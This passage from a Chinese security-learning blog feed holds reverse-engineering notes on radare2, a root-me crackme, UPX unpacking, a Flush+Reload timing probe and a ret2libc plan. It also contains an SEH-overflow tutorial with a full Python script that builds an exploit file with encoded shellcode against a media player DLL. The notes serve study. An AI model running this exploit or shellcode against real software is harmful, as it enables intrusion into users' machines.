class="number">16</span>位字</span><br><span class="line">(gdb) x/<span class="number">1</span>s <span class="number">0X08050b24</span></span><br><span class="line">查看该地址值</span><br></pre></td></tr></table></figure><h3 id="破解方法2"><a href="#破解方法2" class="headerlink" title="破解方法2"></a>破解方法2</h3><p><code>radare2 </code> 类似IDA</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r2 ch25.bin</span><br><span class="line">aaa <span class="comment">//分析函数，参数...</span></span><br><span class="line">VV @main <span class="comment">//使用 VV 进入 图形化模式（需要是函数范围内）。</span></span><br><span class="line">pdf @ main <span class="comment">//分析后就可以正常打印函数代码了（pdf 打印函数代码）</span></span><br></pre></td></tr></table></figure><p>peda是GDB的一个插件<br><a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p><p>gdb-peda$ run jlkd 带参数运行</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;逆向-root-me&quot;&gt;&lt;a href=&quot;#逆向-root-me&quot; class=&quot;headerlink&quot; title=&quot;逆向 root_me&quot;&gt;&lt;/a&gt;逆向 root_me&lt;/h2&gt;&lt;h3 id=&quot;ch25-bin&quot;&gt;&lt;a href=&quot;#ch25-bin&quot; class=&quot;headerlink&quot; title=&quot;ch25.bin&quot;&gt;&lt;/a&gt;ch25.bin&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en&quot;&gt;https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向 学习r2 part2</title>
    <link href="http://finsenty54.github.io/2020/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0r2part2/"/>
    <id>http://finsenty54.github.io/2020/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0r2part2/</id>
    <published>2020-09-27T11:19:49.000Z</published>
    <updated>2020-10-31T08:53:12.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向-学习r2-part2"><a href="#逆向-学习r2-part2" class="headerlink" title="逆向 学习r2 part2"></a>逆向 学习r2 part2</h2><p><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/">https://www.megabeets.net/a-journey-into-radare-2-part-2/</a></p><p>在NX和ASLR的保护下</p><hr><a id="more"></a><p><code>$ r2 -d megabeets_0x2</code><br><code>-d </code> – Open in the debug mode<br>aas – Analyze functions, symbols and more</p><p><code>dcu address      Continue until address</code></p><p><code>VV</code></p><p><code>pdf @ sym.beet</code></p><hr><h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><p><code>ragg2</code>, which allows us to generate a cyclic pattern called De Bruijn Sequence and check the exact offset where our payload overrides the buffer.<br>它允许我们生成一个称为De Bruijn Sequence的循环模式，并检查有效载荷覆盖缓冲区的确切偏移量</p><pre><code>-P [size]       prepend debruijn pattern -q [fragment]   debruijn pattern offset -r              show raw bytes instead of hexpairs</code></pre><p><code>$ ragg2 -P 100 -r</code><br><em>之前SEH攻击 应该有用过</em></p><hr><h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><p><code>rarun2</code>用作启动器，用于运行具有不同环境，参数，权限，目录的程序，并覆盖默认文件描述符（例如stdin）。<br>当您必须使用长参数运行程序，将大量数据传递给stdin或类似的东西时，这很有用，这通常是利用二进制文件的情况。</p><hr><pre><code>$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txt</code></pre><hr><pre><code>$ vim profile.rr2$ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt</code></pre><hr><p><code>$ r2 -r profile.rr2 -d megabeets_0x2</code><br>-r [rarun2]  specify rarun2 profile to load (same as -e dbg.profile=X)<br>-d           debug the executable ‘file’ or running process ‘pid’</p><hr><p>信号是发送到同一进程中的某个进程或特定线程的异步通知，以便将发生的事件通知给它。<br>·当SIGSEGV（11）信号做出无效的虚拟内存引用或分段错误时，即在执行分段违规时，将其发送到进程。</p><hr><p><code>wopO value </code>       Finds the given value into a De Bruijn Pattern at current offset</p><p>| dr                     Show ‘gpr’ registers<br>wopO <code>dr eip</code><br>没有成功<br>wopO 0x41417641</p><hr><p>i   Get info from opened file (see rabin2’s manpage)<br>ii                 Imports<br>iip 更简明</p><hr><p>The plan</p><ol><li>Leak the real address of puts</li><li>Calculate the base address of libc</li><li>Calculate the address of system</li><li>Find an address in libc that contains the string /bin/sh</li><li>Call system with /bin/sh and spawn a shell</li></ol><hr><p><code>过程链接表Procedure Linkage Table（PLT)</code>是一个内存结构，其中包含外部功能的代码存根，这些函数的地址在链接时是未知的。<br>·每当我们在.text段中看到对函数的CALL指令时，都不会直接调用该函数。<br>·相反，它在PLT处调用存根代码，例如<code>func_name @ plt</code>。<br>然后，存根跳转到<code>全局偏移表（GOT）</code>中为此功能列出的地址。<br>如果它是此功能的第一个CALL，则<code>GOT条目将指向PLT，后者将调用动态链接器，该链接器将解析所需功能的实际地址</code><br>下次调用func_name @ plt时，存根直接从<code>GOT获取功能地址</code>。<br>((少了动态链接步骤？？))</p><hr><p><code>pwntools </code>漏洞利用框架</p><hr><pre><code>~ character is radare’s internal grep[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts //Usage: ?v[id][ num]  # Show value0x08048390[0xf7763b30]&gt; ?v reloc.puts</code></pre><p><code>sy按tab键自动搜寻</code></p><hr><pre><code>Usage: dmi    # List/Load SymbolsAll these paddr=0x000xxxxx are the offsets of the function from libc base. </code></pre><hr><p>为此，我们将使用radare的搜索功能。<br>·默认情况下，radare正在dbg.map中搜索，这是当前的内存映射。<br>·我们要搜索所有内存映射，因此我们需要对其进行配置：<br>[0x080483d0]&gt; e search.in = dbg.maps<br>要以可视方式配置雷达，请使用Ve</p><hr><pre><code>Usage: /[!bf] [arg]  Search stuffdmm   List modules of target process[0x080483d0]&gt; ?X 0xf7700768-0xf7599000</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;逆向-学习r2-part2&quot;&gt;&lt;a href=&quot;#逆向-学习r2-part2&quot; class=&quot;headerlink&quot; title=&quot;逆向 学习r2 part2&quot;&gt;&lt;/a&gt;逆向 学习r2 part2&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.megabeets.net/a-journey-into-radare-2-part-2/&quot;&gt;https://www.megabeets.net/a-journey-into-radare-2-part-2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在NX和ASLR的保护下&lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>学习r2</title>
    <link href="http://finsenty54.github.io/2020/09/24/%E5%AD%A6%E4%B9%A0r2/"/>
    <id>http://finsenty54.github.io/2020/09/24/%E5%AD%A6%E4%B9%A0r2/</id>
    <published>2020-09-24T08:29:04.000Z</published>
    <updated>2020-10-31T08:53:12.100Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向-学习r2"><a href="#逆向-学习r2" class="headerlink" title="逆向 学习r2"></a>逆向 学习r2</h2><h3 id="RABIN2-—-Binary-program-info-extractor"><a href="#RABIN2-—-Binary-program-info-extractor" class="headerlink" title="RABIN2 — Binary program info extractor"></a>RABIN2 — Binary program info extractor</h3><pre><code>$ rabin2 -I megabeets_0x1</code></pre><p><code>stripped false</code><br>没有剥离符号表<br><code>static   false</code> //所以是动态链接</p><a id="more"></a><h3 id="r2-radare2"><a href="#r2-radare2" class="headerlink" title="r2 //radare2"></a>r2 //radare2</h3><h4 id="ie"><a href="#ie" class="headerlink" title="ie"></a>ie</h4><pre><code>[0x08048370]&gt; ie</code></pre><p>ie 命令可以打印出程序的入口点</p><hr><h4 id=""><a href="#" class="headerlink" title="?"></a>?</h4><p>在任何一个命令后面添加 ? 来获得更多的子命令信息：<br>    [0x08048370]&gt; i?</p><hr><h4 id="aa"><a href="#aa" class="headerlink" title="aa"></a>aa</h4><p>使用 ‘aa’ 命令来分析文件</p><pre><code>[0x08048370]&gt; a?</code></pre><p>aa?<br>aaa[?]              autoname functions after aa (see afna)</p><hr><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag 是所有类似特征的集合，展示所有的 flag ，用 ‘fs’ 命令<br>    [0x08048370]&gt; fs</p><h4 id="f"><a href="#f" class="headerlink" title="f"></a>f</h4><p> f         list flags (will only list flags from selected flagspaces<br>    [0x08048370]&gt; fs imports; f</p><hr><h4 id="iz"><a href="#iz" class="headerlink" title="iz"></a>iz</h4><p>iz – 列出数据段里的字符串</p><hr><h4 id="axt"><a href="#axt" class="headerlink" title="axt"></a>axt</h4><pre><code>[0x08048370]&gt; axt @@ str.*</code></pre><p> axt [addr]      find data/code references to this address</p><p><code>@@                   # foreach iterator command:</code></p><hr><h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><p>| x @@ sym.*          run ‘x’ over all flags matching ‘sym.’ in current flagspace</p><hr><h4 id="s"><a href="#s" class="headerlink" title="s"></a>s</h4><p>s    # Help for the seek commands. See ?$? to see all variables</p><hr><h4 id="afl"><a href="#afl" class="headerlink" title="afl"></a>afl</h4><p>af?<br>用 ‘afl’ 指令，这个指令代表着分析函数列表（Analyze Functions List）.</p><hr><h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><p>s main<br>用 ‘pdf’（输出反汇编代码）</p><hr><h4 id="m"><a href="#m" class="headerlink" title="m"></a>m</h4><p>m<key> 可以用来标记特定的偏移地址，之后输入对应的key就可以跳转到你设置的地方.</p><hr><h4 id="V"><a href="#V" class="headerlink" title="V"></a>V</h4><p>V 视图模式<br>shell 里输入 VV来进入图形模式</p><hr><p>f sym.<tab> 来定位出 sym.beet 函数<br>pdf @ sym.beet 命令，‘@’ 表示临时查找<br>可视视图界面直接跳转到 beet 函数<br>上面说过的方框中的数字吗？这里直接按 3 就可以了<br> gd 命令，d 就是每一个跳转或者调用代码旁边的 字母</p><hr><h4 id="ahi"><a href="#ahi" class="headerlink" title="ahi"></a>ahi</h4><p>:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7<br>ahi s       set base to string (1)<br>ahi s 是用来设置字符串特定的偏移地址<br>@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后</p><hr><h4 id="r"><a href="#r" class="headerlink" title="r"></a>r</h4><p>r 图形模式刷新</p><hr><h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><p>rahash2 包含很多种算法来求证一个文件或者字符串的校验值,具体的用法请使用 ‘man rahash2 ‘.</p><hr><h4 id="00"><a href="#00" class="headerlink" title="00"></a>00</h4><p>oo           reopen current file<br>ood [args]      # reopen in debug mode (with args)</p><hr><h4 id="dc"><a href="#dc" class="headerlink" title="dc"></a>dc</h4><p>dc   Execution continuation commands<br>| dc                           Continue execution of all children</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;逆向-学习r2&quot;&gt;&lt;a href=&quot;#逆向-学习r2&quot; class=&quot;headerlink&quot; title=&quot;逆向 学习r2&quot;&gt;&lt;/a&gt;逆向 学习r2&lt;/h2&gt;&lt;h3 id=&quot;RABIN2-—-Binary-program-info-extractor&quot;&gt;&lt;a href=&quot;#RABIN2-—-Binary-program-info-extractor&quot; class=&quot;headerlink&quot; title=&quot;RABIN2 — Binary program info extractor&quot;&gt;&lt;/a&gt;RABIN2 — Binary program info extractor&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;$ rabin2 -I megabeets_0x1&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;stripped false&lt;/code&gt;&lt;br&gt;没有剥离符号表&lt;br&gt;&lt;code&gt;static   false&lt;/code&gt; //所以是动态链接&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ARM内联汇编</title>
    <link href="http://finsenty54.github.io/2020/09/24/ARM%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
    <id>http://finsenty54.github.io/2020/09/24/ARM%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</id>
    <published>2020-09-24T00:34:38.000Z</published>
    <updated>2020-10-31T08:53:12.100Z</updated>
    
    <content type="html"><![CDATA[<h2 id="gcc-ARM内联汇编-与-预处理"><a href="#gcc-ARM内联汇编-与-预处理" class="headerlink" title="gcc ARM内联汇编 与 预处理"></a>gcc ARM内联汇编 与 预处理</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>define 编译<code>预处理</code>时，对程序中所有出现的“宏名”，都用宏定义中的字符串去代换</p><p><code>#</code>开头都是预编译指令</p><a id="more"></a><pre><code>#ifndef HEADER_FILE#define HEADER_FILEthe entire header file file#endif</code></pre><p>这种结构就是通常所说的<code>包装器 #ifndef</code>。当再次引用头文件时，<code>条件为假</code>，因为 HEADER_FILE 已定义。此时，预处理器会<code>跳过</code>文件的整个内容，编译器会忽略它。</p><hr><p>您可以使用 typedef 为一个已有的类型取一个新的名字。下面是使用 typedef 定义一个新类型的语法：</p><pre><code>typedef struct config *config_t; //将config* 重新定为 config_ttypedef type newname; </code></pre><hr><h3 id="ARM内联汇编"><a href="#ARM内联汇编" class="headerlink" title="ARM内联汇编"></a>ARM内联汇编</h3><p>GCC编译器支持直接在C或者C++代码中，嵌入ARM汇编代码。其基本格式非常简单，大致如下：</p><pre><code>__asm__ [__volatile__] ( assembler template            : [output operand list]                  /* optional */           : [input operand list]                   /* optional */           : [clobbered register list]              /* optional */           );</code></pre><p>每一个操作数由下列组成</p><pre><code>[name]&quot;[modifier]constraint&quot;(C expression)</code></pre><p><code>name</code> 表示别名</p><p><code>限定符</code>constraint</p><pre><code>   &quot;a”将输入变量放入eax   &quot;b”将输入变量放入ebx “c”将输入变量放入ecx “d”将输入变量放入edx “s”将输入变量放入esi “d”将输入变量放入edi</code></pre><p>GCC中定义了三个<code>修改符</code>modifier，分别是：<br>修改符    含义</p><pre><code>=    只写操作数，通常用于输出操作数中+    可读且可写操作数，必须要列在输出操作数中&amp;    寄存器只能用于输出</code></pre><p>编译器并不会分析你的汇编代码，找出这种被你修改过，需要恢复的寄存器，因此你必须显式的告诉编译器，被你修改过的寄存器有哪些。这就是<code>修改寄存器列表</code>所起到的作用。<br><code>clobbered register list</code></p><h3 id="示例-flush-and-reload"><a href="#示例-flush-and-reload" class="headerlink" title="示例__flush and reload"></a>示例__flush and reload</h3><pre><code>/*SFENCE——串行化发生在SFENCE指令之前的写操作但是不影响读操作。    LFENCE——串行化发生在SFENCE指令之前的读操作但是不影响写操作。    MFENCE——串行化发生在MFENCE指令之前的读写操作。sfence:在sfence指令前的写操作当必须在sfence指令后的写操作前完成。lfence：在lfence指令前的读操作当必须在lfence指令后的读操作前完成。 no instruction fol-lowing it executes before thelfenceinstructionmfence：在mfence指令前的读写操作当必须在mfence指令后的读写操作前完成。*/</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">gettime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> tl;</span><br><span class="line">  <span class="keyword">asm</span> __volatile__(<span class="string">&quot;lfence\nrdtsc&quot;</span> : <span class="string">&quot;=a&quot;</span> (tl): : <span class="string">&quot;%edx&quot;</span>); <span class="comment">//“__volatile__”关键字，这个是可选的，</span></span><br><span class="line">  <span class="comment">//其作用是禁止编译器对后面编写的汇编指令再进行优化</span></span><br><span class="line">  <span class="keyword">return</span> tl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">probe</span><span class="params">(<span class="keyword">char</span> *adrs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> time;</span><br><span class="line">    <span class="comment">//gcc arm</span></span><br><span class="line">  <span class="keyword">asm</span> __volatile__ (</span><br><span class="line">    <span class="string">&quot;  mfence             \n&quot;</span> <span class="comment">//cpuid (intel) 虚拟机会模拟该指令，导致时间增加</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  rdtsc              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span> <span class="comment">//reads  the  64-bitcounter, returning the low 32 bits of the counter in%eax and the high 32 bits in%edx</span></span><br><span class="line">    <span class="string">&quot;  movl %%eax, %%esi  \n&quot;</span> <span class="comment">//把rdtsc返回的时间传入ESI保存</span></span><br><span class="line">    <span class="string">&quot;  movl (%1), %%eax   \n&quot;</span> <span class="comment">//%1表示adrs  reads  4  bytes  from  the  memory  address  in%ecx</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span> <span class="comment">//（）表示指针</span></span><br><span class="line">    <span class="string">&quot;  rdtsc              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  subl %%esi, %%eax  \n&quot;</span> <span class="comment">//rdtsc返回值保存在eax.相减，结果保存在eax</span></span><br><span class="line">    <span class="string">&quot;  clflush 0(%1)      \n&quot;</span> <span class="comment">//()剔除缓存中的值</span></span><br><span class="line">    : <span class="string">&quot;=a&quot;</span> (time)</span><br><span class="line">    : <span class="string">&quot;c&quot;</span> (adrs)   <span class="comment">//c infer edc</span></span><br><span class="line">    :  <span class="string">&quot;%esi&quot;</span>, <span class="string">&quot;%edx&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> time;  <span class="comment">/*Loads shorter than the threshold are presumed tobe served from the cache, </span></span><br><span class="line"><span class="comment">                 indicating that another processhas accessed the memory line since it was last flushed5 from the cache*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;gcc-ARM内联汇编-与-预处理&quot;&gt;&lt;a href=&quot;#gcc-ARM内联汇编-与-预处理&quot; class=&quot;headerlink&quot; title=&quot;gcc ARM内联汇编 与 预处理&quot;&gt;&lt;/a&gt;gcc ARM内联汇编 与 预处理&lt;/h2&gt;&lt;h3 id=&quot;预处理&quot;&gt;&lt;a href=&quot;#预处理&quot; class=&quot;headerlink&quot; title=&quot;预处理&quot;&gt;&lt;/a&gt;预处理&lt;/h3&gt;&lt;p&gt;define 编译&lt;code&gt;预处理&lt;/code&gt;时，对程序中所有出现的“宏名”，都用宏定义中的字符串去代换&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#&lt;/code&gt;开头都是预编译指令&lt;/p&gt;</summary>
    
    
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>SEH</title>
    <link href="http://finsenty54.github.io/2020/09/21/SEH/"/>
    <id>http://finsenty54.github.io/2020/09/21/SEH/</id>
    <published>2020-09-21T14:25:04.000Z</published>
    <updated>2020-10-31T08:53:12.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN学习"><a href="#PWN学习" class="headerlink" title="PWN学习"></a>PWN学习</h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a><p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> ————————— (1)<br>                            |<br>                     ——-+————– (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                ————– (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p><p>当一个异常触发时，会建立自己的栈，push EH Handler的参数，在ESP+8处的EstablisherFrame指向下一个SEH，在这里写pop pop ret的地址</p><p>the <code>first pop</code> will take off<code> 4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code> ESP+8</code>, but because of the 2 pop’s now sits at the top of the stack) and puts that in <code>EIP</code>.</p><h5 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h5><p>ollydbg VIEW-SEH CHAIN</p><h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>产生一个序列，用于定位溢出点</p><p>msf5 &gt; msfpescan -p Player.dll | grep -v “000”<br>寻找pop pop ret 命令地址 -v 不匹配“000”</p><p>int 3 指令（0xcc） 中断指令</p><pre><code>import structuitext = &quot;ui_exploit.txt&quot;junk = &quot;\x41&quot; * 584seh_next = &quot;\xeb\x04\x90\x90&quot;seh_handler = str(struct.pack(&#39;&lt;L&#39;, 0x10018de8))shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;junk2 = &quot;\x90&quot; * 1000fp = open(uitext, &#39;w&#39;)content = junk + seh_next + seh_handler + shellcode + junk2fp.write(content)fp.close()</code></pre><p>总结：<br>SEH链条结构及其在栈中的位置<br>Windows XP SP1添加的XOR和SafeSEH保护机制<br>通过msf的msfpescan从dll中查找带有想要操作的函数（“POP POP RET”）<br>RET操作作为exploit方式的优缺点<br>通过<code>windbg</code>的”!analyze -v“ 和“!exchain”命令查看current SEH指针内容<br>windbg：d eip ; !exchain命令 ；u 地址 ；g 运行</p><p>frog 青蛙</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;PWN学习&quot;&gt;&lt;a href=&quot;#PWN学习&quot; class=&quot;headerlink&quot; title=&quot;PWN学习&quot;&gt;&lt;/a&gt;PWN学习&lt;/h2&gt;&lt;h4 id=&quot;Exploit-writing-tutorial-part-3-SEH-Based-Exploits&quot;&gt;&lt;a href=&quot;#Exploit-writing-tutorial-part-3-SEH-Based-Exploits&quot; class=&quot;headerlink&quot; title=&quot;Exploit writing tutorial part 3 : SEH Based Exploits&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/&quot; title=&quot;Exploit writing tutorial part 3 : SEH Based Exploits&quot;&gt;Exploit writing tutorial part 3 : SEH Based Exploits&lt;/a&gt;&lt;/h4&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>RCE 初探</title>
    <link href="http://finsenty54.github.io/2020/08/18/RCE%20%E5%88%9D%E6%8E%A2/"/>
    <id>http://finsenty54.github.io/2020/08/18/RCE%20%E5%88%9D%E6%8E%A2/</id>
    <published>2020-08-18T13:07:01.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><p>upx == 加壳？<br>代码压缩器，执行时解码后运行<br>PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe</p><a id="more"></a><hr><p>段寄存器 16 位<br>DS 存放数据段的段基址</p><hr><p>每一个<code>内存单元的宽度为8位</code>。<br>[编号]称为地址。<br>内存单元：字节 <code>每个字节有个编号</code>，称为<code>内存地址</code></p><hr><p>dword ptr [esi+13000]=[notepad.01014000]=14D L’ō’</p><p>ds 寄存器没用？</p><hr><p>在栈中设置硬件断点 找到解壳后的OEP<br>具体在<code>PUSHAD</code>中设置硬件断点，指令完成后才暂停 ，也就是<code>POPAD</code> 完成后暂停 ，后面JMP跳转到<code>OEP</code> original EP</p><hr><p>exe默认00400000<br>dll 默认10000000</p><hr><h4 id="节对齐"><a href="#节对齐" class="headerlink" title="节对齐"></a>节对齐</h4><p>Alignment is <code>a rounded up value.</code> Section data size is rounded up for effeciency because the OS moves stuff around in chunks anyway.<br>The File Alignment is usually 512 bytes which fit the blocksize of most filesystems.<br>The Section Alignment is usually 4096 bytes which fit the size of a memory page.<br>So if you have a PE-file with a section (like “.text”) that contains<code> 513</code> bytes of data:</p><p><code>不足的改为整数倍</code><br>Section .text will be rounded up to <code>1024</code> bytes on file.<br>Section .text will be rounded up to <code>4096 </code>bytes in memory.<br>Note the amount of slack space possible both on file and in memory.</p><hr><h4 id="stud-pe"><a href="#stud-pe" class="headerlink" title="stud_pe"></a>stud_pe</h4><p>修改size of optional header值，向文件头插入解码代码<br>在选项头和节区头间插入代码<br>numberofRVAandSIZES表示data_directory结构体元素个数(有些没用，可以覆盖)</p><h4 id="inline-patch-内嵌补丁"><a href="#inline-patch-内嵌补丁" class="headerlink" title="inline patch 内嵌补丁"></a>inline patch 内嵌补丁</h4><p>将补丁代码放在空白块中</p><hr><p>变量名和函数名只是地址的一种助记符，当源文件被编译和链接成可执行程序后，它们都会被替换成地址。</p><p>取地址符&amp;</p><p>.text 的 size of raw data == 400 virtual size == 280 文件中400 加载到内存中只加了280<br>其他值时0x00</p><hr><p>image_scn_men_write 相应内存区的写权限</p><hr><h4 id="rep-movsb-命令"><a href="#rep-movsb-命令" class="headerlink" title="rep movsb 命令"></a>rep movsb 命令</h4><p> b==byte rep == repeats ECX 里大小 循环</p><h4 id="moves-命令"><a href="#moves-命令" class="headerlink" title="moves  命令"></a>moves  命令</h4><p>== ds:esi -&gt; ds:edi<br>decreasing CX, so at the end CX becomes zero.</p><h4 id="RCE经验"><a href="#RCE经验" class="headerlink" title="RCE经验"></a>RCE经验</h4><p>1 压缩器解码<br>2 区域双重加密 内嵌补丁</p><hr><h4 id="test-按位与"><a href="#test-按位与" class="headerlink" title="test 按位与"></a>test 按位与</h4><p>test eax, eax<br>eax==0 zf 设位1</p><hr><h4 id="Ret相当于-Pop-EIP"><a 